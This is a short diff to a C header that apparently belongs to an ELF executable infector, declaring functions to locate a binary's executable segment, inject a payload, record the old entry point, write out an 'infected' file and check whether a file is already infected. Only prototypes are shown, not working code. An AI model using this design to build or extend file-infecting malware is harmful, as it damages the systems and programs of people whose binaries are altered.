@@ -2,8 +2,11 @@
 #include "umbrella.h"
 
 Elf64_Phdr *find_exec_segment(void *map, size_t mapsize);
+void *get_exec_segment_ptr(void *map, ElfInfo *info);
+
 unsigned char *save_original_text(unsigned char *text, size_t size);
-void encrypt_text(unsigned char *text, size_t size, unsigned char key);
-void decrypt_text(unsigned char *text, size_t size, unsigned char key);
-int inject_elf(const char *path);
+int inject_payload(void *map, size_t mapsize, ElfInfo *info, unsigned char *payload, size_t payload_size, uint64_t *old_entry);
+
+int write_infected_file(const char *output_path, void *map, size_t size);
+int already_infected(void *map, ElfInfo *info);
 
